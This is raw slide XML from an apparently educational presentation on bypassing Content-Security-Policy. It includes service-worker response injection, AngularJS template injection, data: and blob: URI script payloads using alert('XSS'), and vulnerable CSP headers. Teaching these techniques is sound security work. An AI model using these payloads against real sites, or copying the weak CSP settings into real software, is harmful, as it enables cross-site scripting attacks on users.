                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Step 2: Service Worker (sw.js)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7500938" y="3283387"/>
            <a:ext cx="4864418" cy="1565077"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1401"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7493675" y="3283387"/>
            <a:ext cx="4878943" cy="1565077"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1401"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7639764" y="3392924"/>
            <a:ext cx="4586764" cy="1346002"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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self.addEventListener('fetch', function(event)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event.respondWith(</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new Response('',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headers: { 'Content-Type': 'text/html' }</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a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1500"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2EFE8"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>});</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2272427" y="6056948"/>
            <a:ext cx="1827014" cy="228362"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1750"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Why it works:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2272427" y="6426518"/>
            <a:ext cx="10085427" cy="576849"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="15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Service Worker intercepts all requests</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="15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Can inject arbitrary content</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="15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CSP doesn't apply to Service Worker responses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3427" y="672227"/>
            <a:ext cx="8760023" cy="538163"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4200"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3350" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Technique 8: AngularJS Template Injection</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="753427" y="1292066"/>
            <a:ext cx="2690812" cy="336352"/>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Vulnerable CSP:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="753427" y="1934766"/>
            <a:ext cx="13123545" cy="658535"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4903"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="742712" y="1934766"/>
            <a:ext cx="13144976" cy="658535"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4903"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="957977" y="2096214"/>
            <a:ext cx="12714446" cy="335637"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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Content-Security-Policy: script-src 'self' https://ajax.googleapis.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="753427" y="2899648"/>
            <a:ext cx="2690812" cy="336352"/>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Vulnerable HTML:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="753427" y="3542348"/>
            <a:ext cx="13123545" cy="4014907"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 804"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="742712" y="3542348"/>
            <a:ext cx="13144976" cy="4014907"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 804"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="957977" y="3703796"/>
            <a:ext cx="12714446" cy="3692009"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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&lt;html ng-app&gt;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&lt;head&gt;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&lt;script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.2/angular.min.js"&gt;&lt;/script&gt;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&lt;/head&gt;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&lt;body&gt;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&lt;h1&gt;AngularJS Template Injection Example&lt;/h1&gt;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&lt;input type="text" ng-model="userInput" placeholder="Enter something here" /&gt;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&lt;p&gt;Your input: {{ userInput }}&lt;/p&gt;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&lt;p&gt;Expression evaluation: {{ 1+1 }}&lt;/p&gt;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  &lt;/body&gt;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1650" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2600"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1650" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2EFE8"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>&lt;/html&gt;</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Technique 11: Data URI Bypass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4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27835"/>
            <a:ext cx="8484870"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Technique 11: Data URI Bypass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="30035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Vulnerable CSP:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="3613071"/>
            <a:ext cx="6244709" cy="702945"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4840"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="782479" y="3613071"/>
            <a:ext cx="6267331" cy="702945"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4840"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1009293" y="3783092"/>
            <a:ext cx="5813703"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Content-Security-Policy: script-src 'self' data:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="45711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Attack:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="5022123"/>
            <a:ext cx="6244709" cy="1065848"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3192"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="782479" y="5022123"/>
            <a:ext cx="6267331" cy="1065848"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3192"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1009293" y="5192144"/>
            <a:ext cx="5813703"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&lt;script src="data:text/javascript,alert('XSS')"&gt;&lt;/script&gt;
</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7436168" y="2776776"/>
            <a:ext cx="6571417" cy="3724870"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 913"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="325F7B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7662982" y="30035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Why it works:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7662982" y="3584734"/>
            <a:ext cx="6117788"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data: URIs are explicitly allowed</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>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Can contain arbitrary JavaScript</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>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Bypasses origin restrictions</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2030"/>
            <a:ext cx="8430935"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Technique 12: Blob URI Bypass</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="4450" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="22777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Vulnerable CSP:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="2887266"/>
            <a:ext cx="6244709" cy="702945"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4840"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="782479" y="2887266"/>
            <a:ext cx="6267331" cy="702945"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4840"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1009293" y="3057287"/>
            <a:ext cx="5813703"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Content-Security-Policy: script-src 'self' blob:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="38453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Attack:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="793790" y="4296318"/>
            <a:ext cx="6244709" cy="2517458"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1352"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="782479" y="4296318"/>
            <a:ext cx="6267331" cy="2517458"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1352"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1009293" y="4466339"/>
            <a:ext cx="5813703" cy="217741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const blob = new Blob(['alert("XSS")'], {type: 'text/javascript'});</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>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const blobUrl = URL.createObjectURL(blob);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>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const script = document.createElement('script');</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>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script.src = blobUrl;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>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document.body.appendChild(script);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7436168" y="2050971"/>
            <a:ext cx="6571417" cy="5176480"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 657"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="325F7B"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7662982" y="22777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Why it works:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7662982" y="2858929"/>
            <a:ext cx="6117788"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Blob URIs are whitelisted</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>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Can create JavaScript blobs dynamically</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1750" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="342900" indent="-342900" algn="l">
              <a:lnSpc>
                <a:spcPts val="2850"/>
              </a:lnSpc>
              <a:buSzPct val="100000"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1750" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F6F0E4"/>
                </a:solidFill>
                <a:latin typeface="Source Sans 3" pitchFamily="34" charset="0"/>
                <a:ea typeface="Source Sans 3" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Source Sans 3" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Executes arbitrary code</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91997" y="1263729"/>
            <a:ext cx="7262932" cy="509230"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="4000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="124E73"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Technique 13: 'strict-dynamic' Misuse</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1691997" y="2007156"/>
            <a:ext cx="3670697" cy="3421142"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 715"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F3EEE3"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Text 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1854875" y="2170033"/>
            <a:ext cx="2037278" cy="254556"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="2000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:latin typeface="MuseoModerno Medium" pitchFamily="34" charset="0"/>
                <a:ea typeface="MuseoModerno Medium" pitchFamily="34" charset="-122"/>
                <a:cs typeface="MuseoModerno Medium" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable CSP:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1854875" y="2556272"/>
            <a:ext cx="3344942" cy="692467"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3531"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1846778" y="2556272"/>
            <a:ext cx="3361134" cy="692467"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3531"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2EFE8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2009656" y="2678430"/>
            <a:ext cx="3035379" cy="448151"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
